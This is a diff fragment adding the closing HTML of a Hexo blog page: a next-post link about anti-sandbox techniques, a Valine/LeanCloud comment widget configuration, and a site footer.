+            <a class="next" rel="next" href="/2020/12-18-%E5%8F%8D%E6%B2%99%E7%AE%B1%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF/">反沙箱虚拟机技术</a>
+            
+        </section>
+	
+		<section id="comments" class="comments">
+		  <style>
+			.comments{margin:30px;padding:10px;background:#fff}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+		  </style>
+		  <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: 'ehQ0k7G3fcpwmkyxhG8U6DzL-gzGzoHsz',
+      app_key: 'AwwXGgbdqswiimAY0qJYhtRa',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+		</section>
+	
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© SeikoSrp | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
